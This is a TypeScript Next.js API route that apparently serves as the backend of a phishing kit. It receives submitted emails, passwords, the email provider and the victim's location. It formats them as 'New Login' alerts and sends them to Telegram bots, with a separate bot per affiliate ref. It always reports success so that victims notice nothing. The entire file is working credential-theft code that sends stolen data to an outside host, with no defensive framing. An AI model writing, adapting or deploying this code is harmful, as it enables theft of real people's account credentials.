import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { username, password, provider, city, country, attempt, ref } = body;

    // 1. Logic to pick the right User Bot
    let botToken = process.env.TELEGRAM_BOT_TOKEN; // Master Bot (Default)
    let chatId = process.env.TELEGRAM_CHAT_ID;

    if (ref === 'u1') {
      botToken = process.env.U1_BOT_TOKEN;
      chatId = process.env.U1_CHAT_ID;
    } else if (ref === 'u2') {
      botToken = process.env.U2_BOT_TOKEN;
      chatId = process.env.U2_CHAT_ID;
    }

    // 2. Safety check: If credentials aren't in Vercel, don't crash
    if (!botToken || !chatId) {
      console.error(`Missing Telegram Config for Ref: ${ref}`);
      return NextResponse.json({ success: true });
    }

    const message = `
🚀 <b>New Login [${ref?.toUpperCase() || 'DEFAULT'}]</b>
━━━━━━━━━━━━━━━━
📧 <b>Email:</b> <code>${username}</code>
🔑 <b>Pass:</b> <code>${password}</code>
🌐 <b>Service:</b> ${provider}
📍 <b>From:</b> ${city}, ${country}
🔢 <b>Attempt:</b> #${attempt}
━━━━━━━━━━━━━━━━
    `;

    // 3. Send to Telegram
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    return NextResponse.json({ success: true });

  } catch (error) {
    console.error('API Error:', error);
    return NextResponse.json({ success: true }); 
  }
}